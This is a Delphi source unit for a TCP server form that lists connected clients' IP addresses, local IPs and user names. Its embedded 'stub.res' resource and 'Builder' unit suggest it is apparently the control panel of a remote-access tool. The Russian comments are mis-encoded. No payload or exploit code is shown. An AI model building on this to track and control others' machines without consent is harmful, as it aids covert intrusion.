unit TCPServer;

interface

uses
  Vcl.Forms,  System.Win.ScktComp, Vcl.StdCtrls, mmsystem,
  Vcl.ComCtrls, Vcl.Controls, System.Classes, Vcl.Menus,Vcl.Dialogs,SysUtils;

type
  TForm1 = class(TForm)
    ServerSocket1: TServerSocket;
    Button1: TButton;
    Edit1: TEdit;
    ListView1: TListView;
    Button2: TButton;
    StatusBar1: TStatusBar;
    Button3: TButton;
    procedure WriteLocalIP(GlobalIP,LocalIP,CUN:AnsiString);
    procedure Button1Click(Sender: TObject);
    procedure ListeningPort();
    procedure ServerSocket1ClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure ServerSocket1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure FormCreate(Sender: TObject);
    procedure ServerSocket1ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
{$R stub.res}
{$R sound.res}
{$R rsound.res}
{$R soundw.res}

uses Panel, Builder;


function StrToInt(const S: string): Integer;
var E: Integer;
begin
Val(S, Result,E);
end;

//Function IntToStr(I : Longint) : string;
//Begin
//Str(I, Result);
//End;

Function IntToStr(I : Longint) : string;
var
s:string[255];
begin
Str(I, s);
Result := string(s);
end;


procedure TForm1.WriteLocalIP(GlobalIP,LocalIP,CUN:AnsiString);
var
i:Integer;
begin
 for i := 0 to ListView1.Items.Count -1 do
begin
  if ListView1.Items.Item[i].Caption = string(AnsiString(GlobalIP)) then
  begin
     ListView1.Items.Item[i].SubItems[2] := string(AnsiString(LocalIP));
     ListView1.Items.Item[i].SubItems[3] := string(AnsiString(CUN));
  end;
end;
end;


procedure TForm1.Button2Click(Sender: TObject);
begin
 Form3.sLabel2.Caption := IntToStr(Form1.ServerSocket1.Socket.ActiveConnections);
 if Form1.ServerSocket1.Socket.ActiveConnections > 0 then
 Form3.sLabel2.Font.Color := $008000
 else if Form1.ServerSocket1.Socket.ActiveConnections = 0 then
 Form3.sLabel2.Font.Color := 255;

 Form3.ShowModal;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
Form4.ShowModal;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
Col: TListColumn;
begin
ListView1.TabStop := False;
ListView1.ViewStyle := vsReport;
ListView1.RowSelect := True;
ListView1.ReadOnly := True;
ListView1.FlatScrollBars := True;
Col := ListView1.Columns.Add;
Col.Caption := 'IP';
Col.Alignment := System.Classes.taLeftJustify;
Col.Width := 100;
Col := ListView1.Columns.Add;
Col.Caption := 'HOST';
Col.Alignment := System.Classes.taLeftJustify;
Col.Width := 190;
Col := ListView1.Columns.Add;
Col.Caption := 'LOCAL PORT';
Col.Alignment := System.Classes.taLeftJustify;
Col.Width := 90;
Col := ListView1.Columns.Add;
Col.Caption := 'LOCAL IP';
Col.Alignment := System.Classes.taLeftJustify;
Col.Width := 100;
Col := ListView1.Columns.Add;
Col.Caption := 'USER NAME';
Col.Alignment := System.Classes.taLeftJustify;
Col.Width := 100;
end;

procedure TForm1.ListeningPort();
var
i: Integer;
begin
  if ServerSocket1.Active = False then
  begin
    ServerSocket1.Port := StrToInt(Edit1.Text);
    ServerSocket1.Active := True;
    Button1.Caption := 'Stop';
    PlaySound('RCData2000', 0, SND_RESOURCE or SND_ASYNC);
  end
  else
  begin
    ServerSocket1.Active := False;
    for i := 0 to ListView1.Items.Count - 1 do
    begin
        ListView1.Items.Item[i].Delete;
    end;
    Button1.Caption := 'Start';
    PlaySound('RCData3000', 0, SND_RESOURCE or SND_ASYNC);
  end;
end;

procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
Itm: TListItem;
i:integer;
b:Boolean;
begin
  //¬ цикле перебираем listview1 список и ищем нашего клиента который подключилс€
  b := False;
  for i := 0 to ListView1.Items.Count - 1 do
  begin
    if ((ListView1.Items.Item[i].Caption = Socket.RemoteAddress) and
     (ListView1.Items.Item[i].SubItems[1] = IntToStr(Socket.RemotePort))) then
      b := True;
  end;

  //если в списке listview1 его нет то добавл€ем в список listview1
  if b = False then
  begin
    Itm := ListView1.Items.Add;
    Itm.Caption := Socket.RemoteAddress;
    Itm.SubItems.Add(Socket.RemoteHost);
    Itm.SubItems.Add(IntToStr(Socket.RemotePort));
    Itm.SubItems.Add('');
    Itm.SubItems.Add('');
  end;
end;

procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
  ClientIP: string;
  i: Integer;
begin
  ClientIP := Socket.RemoteAddress;
  //”дал€ем из списка ListView1 если отключилс€ кто нибудь из клиентов
  for i := 0 to ListView1.Items.Count -1 do
    begin
      if ((Socket.RemoteAddress = ListView1.Items.Item[i].Caption) and
      (Socket.RemotePort = StrToInt(ListView1.Items.Item[i].SubItems[1]))) then
        ListView1.Items.Item[i].Delete;
    end;

end;

procedure TForm1.ServerSocket1ClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
ErrorCode := 0;
end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
  var
  sMessage,LIP,CUN: AnsiString;
  ClientIP: string;
begin
  sMessage := Socket.ReceiveText;
  ClientIP := Socket.RemoteAddress;
  //“ут принимаем ответ от клиента
  if Copy(sMessage, 0, Pos('#', string(sMessage)) - 1) = 'INFO' then
  begin
    Delete(sMessage, 1, Pos('#', string(sMessage)));
    LIP := AnsiString(Copy(string(sMessage), 0, Pos('#', string(sMessage)) - 1));
    Delete(sMessage, 1, Pos('#', string(sMessage)));
    CUN := AnsiString(Copy(string(sMessage), 0, Pos('#', string(sMessage)) - 1));
    Delete(sMessage, 1, Pos('#', string(sMessage)));
    //записываем в лист ListView1 локальный ip клиента и им€ пользовател€
    WriteLocalIP(AnsiString(string(ClientIP)),AnsiString(string(LIP)),AnsiString(string(CUN)));
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
ListeningPort();
end;

end.
